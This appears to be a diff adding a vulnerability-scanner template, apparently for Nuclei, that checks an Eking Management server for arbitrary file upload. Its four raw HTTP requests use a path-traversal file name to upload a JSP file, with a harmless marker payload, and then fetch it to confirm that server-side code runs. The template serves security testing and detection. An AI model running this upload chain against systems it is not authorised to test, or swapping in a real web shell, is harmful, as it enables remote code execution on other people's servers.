@@ -1,0 +1,76 @@
+id: poc-yaml-ekingcn-html5upload-upload
+info:
+  name: Eking Management Html5Upload Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+variables:
+  t1: "{{rand_int(100, 1000)}}"
+http:
+  - raw:
+      - |
+        POST /Html5Upload.ihtm HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        comm_type=INIT&sign_id=123456&vp_type=default&file_name=../../test{{t1}}.jsp&file_size=2048
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"status\":\"OK\""
+  - raw:
+      - |
+        POST /Html5Upload.ihtm HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR
+
+        ------WebKitFormBoundaryj7OlOPiiukkdktZR
+        Content-Disposition: form-data; name="comm_type"
+
+        DATA
+        ------WebKitFormBoundaryj7OlOPiiukkdktZR
+        Content-Disposition: form-data; name="sign_id"
+
+        123456
+        ------WebKitFormBoundaryj7OlOPiiukkdktZR
+        Content-Disposition: form-data; name="data_inde"
+
+        0
+        ------WebKitFormBoundaryj7OlOPiiukkdktZR
+        Content-Disposition: form-data; name="data"; filename="chunk1"
+        Content-Type: application/octet-stream
+
+        <% out.println("This website has a vulnerability");%>
+        ------WebKitFormBoundaryj7OlOPiiukkdktZR--
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"status\":\"OK\""
+  - raw:
+      - |
+        POST /Html5Upload.ihtm HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        comm_type=END&sign_id=123456&file_name=../../test{{t1}}.jsp
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"status\":\"OK\""
+          - "\"fileUrl\":\"/upload2/\""
+  - raw:
+      - |
+        GET /test{{t1}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "This website has a vulnerability"
